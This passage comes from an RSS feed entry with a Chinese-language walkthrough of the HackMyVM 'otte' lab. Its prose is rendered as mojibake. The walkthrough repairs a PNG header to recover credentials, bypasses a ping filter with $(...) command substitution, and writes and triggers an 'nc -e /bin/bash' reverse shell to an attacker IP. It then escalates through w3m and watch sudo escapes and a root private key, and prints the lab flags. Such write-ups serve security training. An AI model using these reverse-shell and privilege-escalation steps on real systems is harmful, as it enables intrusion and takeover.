ä½†æ˜¯ç»å¸¸ç©CTF æ‚é¡¹çš„å¸ˆå‚…è‚¯å®šå°±å¯ä»¥å‘ç°ç¬¬ä¸€è¡Œæœ‰ä¸€ä¸ª IHDR è¿™ä¸ªç»å¸¸åœ¨Pngå›¾ç‰‡é‡Œé¢å‡ºç°<br>
ç„¶ååªéœ€è¦æ‰¾ä¸€ä¸ªpngå›¾ç‰‡æå–å‡ºå®ƒå‰é¢çš„16è¿›åˆ¶æ›¿æ¢æ‰å³å¯<br>
8950 4E47 0D0A 1A0A<br>
ç„¶åå¯¼å‡ºå³å¯<br>
<img alt="Pasted image 20241228143249" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228143249.png" referrerpolicy="no-referrer"> <br>å¯¼å‡ºåå¯ä»¥å¾—åˆ°ä¸€å¼ äºŒç»´ç <br>
<img alt="download" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/download.png" referrerpolicy="no-referrer"><br>
è§£æåè·å–åˆ°ä¸€ä¸ªç½‘ç«™ <a rel="noopener nofollow" class="external-link" href="https://eqrcode.co/a/SVxQdM" target="_blank">https://eqrcode.co/a/SVxQdM</a><br>
è®¿é—®ç½‘ç«™å¯ä»¥è·å–åˆ°thomasè´¦æˆ·çš„å¯†ç  thomas:youareonthegoodwaybro<br><br>thomas@otte:~$ sudo -l
Matching Defaults entries for thomas on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User thomas may run the following commands on otte:
    (laetitia) NOPASSWD: /usr/bin/python3 /home/laetitia/simpler.py *

<br><br>è§‚å¯Ÿä»£ç åœ¨ exec_ping å¤„å‘ç°äº†å¯ä»¥åˆ©ç”¨çš„åœ°æ–¹<br>thomas@otte:~$ cat /home/laetitia/simpler.py
...
def exec_ping():
    forbidden = ['&amp;', ';', '-', '`', '||', '|']
    command = input('Enter an IP: ')
    for i in forbidden:
        if i in command:
            print('Got you')
            exit()
    os.system('ping ' + command)

<br>è¿™é‡Œæ²¡æœ‰è¿‡æ»¤ $ ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ å‘½ä»¤æ›¿æ¢è¯­æ³•$(...) è¿›è¡Œç»•è¿‡<br>
æˆ‘ä»¬å…ˆå†™ä¸€ä¸ªåå¼¹shellçš„è„šæœ¬<br>thomas@otte:/tmp$ echo 'nc -e /bin/bash 192.168.56.6 2233' &gt;shell.sh
<br>ç„¶åæ‰§è¡Œè„šæœ¬åå¼¹shellå®ç°ææƒ<br>thomas@otte:/tmp$ sudo -u laetitia /usr/bin/python3 /home/laetitia/simpler.py -p
***********************************************
     _                 _
 ___(_)_ __ ___  _ __ | | ___ _ __ _ __  _   _
/ __| | '_ ` _ \| '_ \| |/ _ \ '__| '_ \| | | |
\__ \ | | | | | | |_) | |  __/ |_ | |_) | |_| |
|___/_|_| |_| |_| .__/|_|\___|_(_)| .__/ \__, |
                |_|               |_|    |___/
                                @ironhackers.es

***********************************************

Enter an IP: $(bash /tmp/shell.sh)

<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# pwncat-cs -lp 2233

(local) pwncat$
(remote) laetitia@otte:/tmp$ whoami
laetitia

<br><br>(remote) laetitia@otte:/tmp$ sudo -l
Matching Defaults entries for laetitia on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User laetitia may run the following commands on otte:
    (cedric) NOPASSWD:  

<br><img alt="Pasted image 20241228150404" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228150404.png" referrerpolicy="no-referrer"><br>
è¿™é‡Œæœ‰ä¸€ä¸ªæ–‡ä»¶è¯»å–ï¼Œ<br>
ä½†æ˜¯w3mçš„äº¤äº’æ¨¡å¼æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„<br>
åˆ©ç”¨äº¤æ¢æ¨¡å¼ææƒå³å¯<br>(remote) laetitia@otte:/home/laetitia/.w3m$ sudo -u cedric /usr/bin/w3m "/etc/passwd"
è¿›å»å æ‰§è¡Œ ï¼bash
cedric@otte:/home/laetitia/.w3m$ whoami
cedric

(remote) cedric@otte:/home/cedric$ cat user.txt
e1e4e2e00a00df7b40c5436155ab4996
<br><br>è¿›æ¥åæœ‰ä¸€ä¸ªid_rsa<br>(remote) cedric@otte:/home/cedric$ ls
id_rsa  user.txt
<br>å‘ç°æ˜¯rootçš„ç§é’¥<br>â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# chmod 600 id_rsa

â”Œâ”€â”€(rootã‰¿kali)-[~/Desktop/hmv/otte]
â””â”€# ssh-keygen -y -f id_rsa
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzc3fvk0OLTl7Mx2VF6cr9A6AfAIV05BjNmrBnJ+lxNtP4fYzYjnvxNDtv3lbeLHsyuZD6C29nPCpvi7hUdX5tjjt5e8aFcH5Wtu1zOouXjs8RV6tCUBp433igqXwbVl1WKeQ7vYO+yuqBBacJNkXPU0e0ROwXBFWDklOYwSvnRW6Yi3VK7MQueQgP+3+ajLnwpmpOxndi3hCNwOppUlDNhEm6f8rJ4zatAXPP5SMIp6/P3c98Qjn0zHdkI7t3kL6HU5uGwQsQi3WJGz18YavwyjXHSlQLlwhTDGgOSQ6zpx4WJ7iY7mK/dL1c7CNoF115rpgqHyFJQCdlvsgIJ9jN root@otte
<br>ç›´æ¥sshä¸Šå»å³å¯<br>root@otte:~# cat root.txt
84decf19261819687b63c8210cd28f7c
<br><br>(remote) cedric@otte:/home/cedric$ sudo -l
Matching Defaults entries for cedric on otte:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cedric may run the following commands on otte:
    (ALL : ALL) NOPASSWD: /usr/bin/mmwatch

<br>mmwatch å®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªpythonè„šæœ¬ï¼Œä»–è°ƒç”¨äº† watch ç¨‹åºï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨ watch çš„ææƒæ–¹å¼ç”¨å®ƒè¿›è¡Œææƒ<br>
<img alt="Pasted image 20241228152217" src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228152217.png" referrerpolicy="no-referrer"><br>sudo -u root mmwatch  -x "sh -c 'reset; exec sh 1&gt;&amp;0 2&gt;&amp;0'"
(remote) root@otte:/home/cedric$ id
uid=0(root) gid=0(root) groups=0(root)

]]></description><link>https://www.c1trus.top/24-æ¸—é€/hmv/49.otte.html</link><guid isPermaLink="false">24-æ¸—é€/HMV/49.otte.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Sat, 28 Dec 2024 13:45:42 GMT</pubDate><enclosure url="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src="https://yurain.oss-cn-chengdu.aliyuncs.com/Obsidian/Pasted%20image%2020241228123243.png"&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Home]]></title><description><![CDATA[ 
 <br>continue...<br><br><br><br><br><br>]]></description><link>https://www.c1trus.top/40-obsidian/home.html</link><guid isPermaLink="false">40-Obsidian/Home.md</guid><dc:creator><![CDATA[C1trus]]></dc:creator><pubDate>Sat, 28 Dec 2024 13:57:12 GMT</pubDate></item></channel></rss>